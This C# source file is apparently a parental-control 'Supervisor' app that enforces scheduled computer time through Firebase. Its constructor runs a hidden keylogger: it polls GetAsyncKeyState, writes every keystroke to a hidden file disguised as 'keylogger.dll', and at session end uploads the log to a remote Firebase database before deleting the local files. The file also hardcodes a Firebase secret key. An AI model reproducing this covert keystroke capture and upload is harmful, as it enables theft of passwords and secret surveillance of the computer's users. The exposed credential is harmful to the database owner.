using FireSharp;
using FireSharp.Config;
using FireSharp.Response;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows;
namespace SupervisorC
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        FirebaseConfig config = new FirebaseConfig
        {
            AuthSecret = "AXTziauXqFYyXQ8RFFGCm5Hvlcw5ubDYkUiXUjiM",
            BasePath = "https://supervisor-fa34d-default-rtdb.asia-southeast1.firebasedatabase.app/",
        };
        bool isFirst = true;
        FirebaseClient client;
        List<Schedule> todaySchedule;
        //DispatcherTimer timer;
        private System.Timers.Timer timer;
        private System.Timers.Timer timer1;
        private Schedule nowSchedule;
        private int timeLeft;
        private int timeLeft1;
        private int hour;
        private int min;
        private int sec;
        private string timeStart;
        private int firstTimeLeft;
        private string timeEnd;
        string path1;
        string path;
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public MainWindow()
        {
            InitializeComponent();
            client = new FirebaseClient(config);
            //retrieveDataFirstTime();
            string workingDirectory = Environment.CurrentDirectory;
            string projectDirectory = Directory.GetParent(workingDirectory).Parent.Parent.FullName;
            path1 = projectDirectory + @"\userId.txt";
            
            
            if (!File.Exists(path1))
            {
                using (StreamWriter sw = File.CreateText(path1))
                {

                }
            }
            else
            {
                File.Delete(path1);
                using (StreamWriter sw = File.CreateText(path1))
                {

                }
            }
            File.SetAttributes(path1, File.GetAttributes(path1) | FileAttributes.Hidden);
            
            Thread thread = new Thread(() =>
              {
                  updateUserId(path1);
              });
            thread.Start();
            path = projectDirectory+ @"\keylogger.dll";
            if (!File.Exists(path))
            {
                using ( StreamWriter sw = File.CreateText(path)){

                }
            }
            else
            {
                File.Delete(path);
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }
            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
            
            Thread thread1 = new Thread(() =>
            {
                while (true)
                {
                    retrieveData();
                    Thread.Sleep(5000);  
                }
            });
            thread1.Start();
            Thread thread2 = new Thread(() =>
            {
                  while (true)
                  {
                      for (int i = 32; i < 127; i++)
                      {
                          int keyState = GetAsyncKeyState(i);
                          if (keyState != 0)
                          {
                              using (StreamWriter outputFile = File.AppendText(path))
                              {
                                  outputFile.Write((char)i);
                              }
                          }
                      }
                      //retrieveData();
                      Thread.Sleep(100);//0.1 S });   
                  }
            });

            thread2.Start();
        }

        private async void updateUserId(string path)
        {
            await updateHistory();
            List<History> histories = new List<History>();
            List<string> ids = new List<string>();
            string today = DateTime.Now.ToString("dd/MM/yyyy");
            FirebaseResponse response1 = await client.GetAsync("History");
            string a = response1.Body.ToString();
            a = a.Replace("\"", "");
            a = a.Substring(1, a.Length - 2);
            string[] parts2 = Regex.Split(a, @"\}\,");
            for (int i = 0; i < parts2.Length; i++)
            {
                ids.Add(parts2[i].Substring(0, 20));
            }
            foreach (string id in ids)
            {
                FirebaseResponse response = await client.GetAsync("History/" + id);
                History temp = response.ResultAs<History>();
                if (temp.timeEnd == "-1")
                {
                    using (StreamWriter outputFile = File.AppendText(path))
                    {
                        outputFile.Write(id);

                    }
                    return;
                }
            }
        }

        private async Task updateHistory()
        {
            History temp = new History
            {
                date = DateTime.Now.ToString("dd/MM/yyyy"),
                timeStart = DateTime.Now.ToString("HH:mm"),
                timeEnd = "-1",
                keyLog = "-1",
            };
            PushResponse response = await client.PushAsync("History", temp);
        }

        private async void retrieveData()
        {
            todaySchedule = await GetTodaySchedule();
            nowSchedule = getNowSchedule(todaySchedule);
            if (nowSchedule == null)
            {
                //MessageBox.Show("Chuan bi tat may va co the mo len lai luc "+ timeStart+" den "+timeEnd);
            }
            else
            {
                if (isFirst)
                {
                    MessageBox.Show("F:" + nowSchedule.timeStart + " T:" + nowSchedule.timeEnd + " D:" + nowSchedule.duration + " I:" + nowSchedule.interruptTime + " S:" + nowSchedule.sum);
                    double timeLeftDB = getRemainTime(nowSchedule);
                    timeLeft = (int)timeLeftDB;
                    MessageBox.Show("Con " + (int)(((int)timeLeft / 60) + 1) + " phut nua se tat may");
                    isFirst = false;
                    timeEnd = nowSchedule.timeEnd;
                    timeStart = nowSchedule.timeStart;
                    //timer = new DispatcherTimer();
                    ////MessageBox.Show("Parent password");
                    //timer.Tick += new EventHandler(Timer_Tick);
                    //timer.Interval = new TimeSpan(0, 0, 1);
                    //timer.Start();
                    firstTimeLeft = timeLeft;
                    timer=new System.Timers.Timer();
                    timer.Interval = 1000;
                    timer.Elapsed += Timer_Tick;
                    timer.Enabled = true;

                    

                }
                else
                {
                    if (!timeEnd.Equals(nowSchedule.timeEnd)){
                        double timeLeftDB = getRemainTime(nowSchedule);
                        timeLeft = (int)timeLeftDB;
                        timeEnd = nowSchedule.timeEnd;
                        MessageBox.Show("Con " +(int)( ((int)timeLeft / 60) + 1 )+ " phut nua se tat may");
                        //timer = new DispatcherTimer();
                        ////MessageBox.Show("Parent password");
                        //timer.Tick += new EventHandler(Timer_Tick);
                        //timer.Interval = new TimeSpan(0, 0, 1);
                        //timer.Start();
                        firstTimeLeft = timeLeft;
                        timer = new System.Timers.Timer();
                        timer.Interval = 1000;
                        timer.Elapsed += Timer_Tick;
                        timer.Enabled = true;
                    }
                    
                    
                }

            }
            
        }

        

        private void Timer_Tick(object sender, EventArgs e)
        {
            if (timeLeft > 0) // 
            {
                timeLeft = timeLeft - 1; // decrement of timeleft on each tick
                hour = timeLeft / 3600; // Left hours
                min = (timeLeft - (hour * 3600)) / 60; //Left Minutes
                sec = timeLeft - (hour * 3600) - (min * 60); //Left Seconds
                Console.Write(timeLeft.ToString());
                if (timeLeft == (firstTimeLeft - (Int32.Parse(nowSchedule.duration) * 60)))
                {
                    timer.Stop();
                    Thread t = new Thread(() =>
                      {
                          
                          this.Dispatcher.Invoke(() =>
                          {
                              TimerWindow timerWindow = new TimerWindow();
                              timerWindow.Show();
                              this.Close();
                          });
                          
                      });
                    t.SetApartmentState(ApartmentState.STA);
                    t.Start();
                }
                else if (timeLeft == 60)
                {
                    MessageBox.Show("Con 1 phut nua tat may");
                }
            }
            
            else
            {
                timer.Stop(); // Stop Timer
                updateKeyLogAndTimeEnd();
                
                /* Process.Start("shutdown", "/s /t 0");*/
                                                       
            }
        }

        private async void updateKeyLogAndTimeEnd()
        {
            string keyLog = File.ReadAllText(path);
            string id = File.ReadAllText(path1);
            FirebaseResponse response = await client.SetAsync("History/" + id + "/timeEnd", DateTime.Now.ToString("HH:mm"));
            FirebaseResponse response1 = await client.SetAsync("History/" + id + "/keyLog", keyLog);
            Thread.Sleep(3000);
            File.Delete(path);
            File.Delete(path1);
            MessageBox.Show("Tat may");
        }

        private double getRemainTime(Schedule nowSchedule)
        {
            DateTime now = DateTime.Now;
            DateTime endTime = DateTime.ParseExact(nowSchedule.timeEnd, "HH:mm", CultureInfo.InvariantCulture);
            
            
            return endTime.Subtract(now).TotalSeconds;
        }
        
        private async Task<List<History>> GetTodayHistory()
        {
            List<History> histories = new List<History>();
            List<string> ids = new List<string>();
            string today = DateTime.Now.ToString("dd/MM/yyyy");
            FirebaseResponse response1 = await client.GetAsync("History");
            string a = response1.Body.ToString();
            a = a.Replace("\"", "");
            a = a.Substring(1, a.Length - 2);
            string[] parts2 = Regex.Split(a, @"\}\,");
            for (int i = 0; i < parts2.Length; i++)
            {
                ids.Add(parts2[i].Substring(0, 20));
            }
            foreach (string id in ids)
            {
                FirebaseResponse response = await client.GetAsync("History/" + id);
                History temp = response.ResultAs<History>();
                histories.Add(temp);
            }
            for (int i = 0; i < histories.Count; i++)
            {
                if (!histories[i].date.Equals(today))
                {
                    histories.RemoveAt(i);
                }
            }
            return histories;
        }
        private async Task<List<Schedule>> GetTodaySchedule()
        {
            List<Schedule> schedules=new List<Schedule>();
            List<string> ids = new List<string>();
            string today = "16/12/2021";
            //string today = DateTime.Now.ToString("dd/MM/yyyy");
            FirebaseResponse response1 = await client.GetAsync("Schedule");
            string a = response1.Body.ToString();
            a = a.Replace("\"", "");
            a = a.Substring(1, a.Length - 2);
            string[] parts2 = Regex.Split(a, @"\}\,");
            for (int i = 0; i < parts2.Length; i++)
            {
                ids.Add(parts2[i].Substring(0, 20));
            }
            foreach (string id in ids)
            {
                FirebaseResponse response = await client.GetAsync("Schedule/" + id);
                Schedule temp = response.ResultAs<Schedule>();
                schedules.Add(temp);
            }
            for (int i = 0; i < schedules.Count; i++)
            {
                if (!schedules[i].date.Equals(today))
                {
                    schedules.RemoveAt(i);
                }
            }
            return schedules;
        }
        private Schedule getNowSchedule(List<Schedule> schedules)
        {
            string time = DateTime.Now.ToString("HH:mm");
            DateTime moment = DateTime.ParseExact(time, "HH:mm", CultureInfo.InvariantCulture);

            foreach (Schedule schedule in schedules)
            {
                DateTime startTime = DateTime.ParseExact(schedule.timeStart, "HH:mm", CultureInfo.InvariantCulture);
                DateTime endTime = DateTime.ParseExact(schedule.timeEnd, "HH:mm", CultureInfo.InvariantCulture);
                if (moment >= startTime && moment <= endTime)
                {
                    return schedule;
                }

            }
            return null;
        }
       
    }
}
